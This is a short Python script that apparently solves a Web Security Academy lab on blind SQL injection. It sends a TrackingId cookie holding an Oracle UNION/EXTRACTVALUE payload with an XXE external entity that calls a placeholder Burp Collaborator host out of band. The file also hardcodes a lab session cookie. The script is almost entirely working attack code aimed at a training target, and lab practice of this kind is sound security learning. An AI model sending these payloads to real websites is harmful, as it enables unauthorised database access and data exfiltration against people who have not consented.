import requests
import time
import sys

class SolveSqli:
    
    def __init__(self):
        self.passLenght = 0
        self.url = "https://0aa200b0044f795983f4cdb600d000f5.web-security-academy.net/filter?category=Food+%26+Drink"

   
    def runRequest(self, TrackingId="", check=""):
        try:
            resp = requests.get(self.url, cookies={"TrackingId":TrackingId, "session":"IQSWjQR9Zs7U05syR2VqH276F3X7BJoy"})
            return resp.text
        except :
            return False
        

    def leakkData(self):


        TrackingId=f"9rnCfZEDaDwNOKD3'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+\"http%3a//BURP-COLLABORATOR-SUBDOMAIN/\">+%25remote%3b]>'),'/l')+FROM+dual--"
        res = self.runRequest(TrackingId=TrackingId, check="Welcome back!")
        print(res)
               




x = SolveSqli()
x.leakkData()